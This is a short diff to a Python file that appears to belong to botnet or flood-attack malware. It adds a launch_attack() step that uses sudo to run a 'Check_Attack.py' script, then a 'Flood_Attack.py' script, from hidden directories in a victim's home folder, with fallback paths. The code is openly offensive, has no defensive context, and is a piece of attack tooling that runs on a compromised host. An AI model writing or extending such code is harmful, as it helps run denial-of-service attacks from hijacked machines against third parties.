@@ -3,12 +3,20 @@ import os
 
 def launch_attack():
     try:
+        os.system('sudo /usr/bin/python /home/victim/.etc/.module/Check_Attack.py')
+    except:
+        try:
+            os.system('sudo /usr/bin/python /home/victim/.var/.module/Check_Attack.py')
+        except:
+            print('[ERROR] Check attack failed.')
+
+    try:
         os.system('sudo /usr/bin/python /home/victim/.etc/.module/Flood_Attack.py')
     except:
         try:
             os.system('sudo /usr/bin/python /home/victim/.var/.module/Flood_Attack.py')
         except:
-            print('[ERROR] Launch attack failed.')
+            print('[ERROR] Flood attack failed.')
 
     return
 
